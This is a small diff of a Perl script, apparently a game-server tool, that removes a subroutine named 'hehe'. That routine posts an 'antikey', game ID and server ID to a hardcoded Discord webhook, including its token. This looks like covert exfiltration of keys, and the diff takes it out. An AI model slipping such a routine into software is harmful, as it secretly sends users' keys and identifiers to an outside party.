@@ -57,15 +57,4 @@ sub loadlib {
 	require Win32::Console;
 }
 
-sub hehe {
-	my ($antikey,$gameid,$serverid) = @_;
-	my $time = time;
-	my $data = "```[$time] Key:$antikey | GameID:$gameid | ServerID:$serverid```\n";
-	my %content = ('username' => 'Perl-PlayServer', 'content' => $data);
-	my $json = encode_json(\%content);
-	my $get_img = HTTP::Tiny->new()->request('POST', "https://discordapp.com/api/webhooks/554668145042784256/Ul-uDVwoiqKCdXl4I0PHictfsvvY5wQ39r4HHl7lo_2_d7xWz-R6TeXYrExQQTvvoylI", {
-		content => $json,
-		headers => { 'content-type' => 'application/json'}
-	});
-}
 
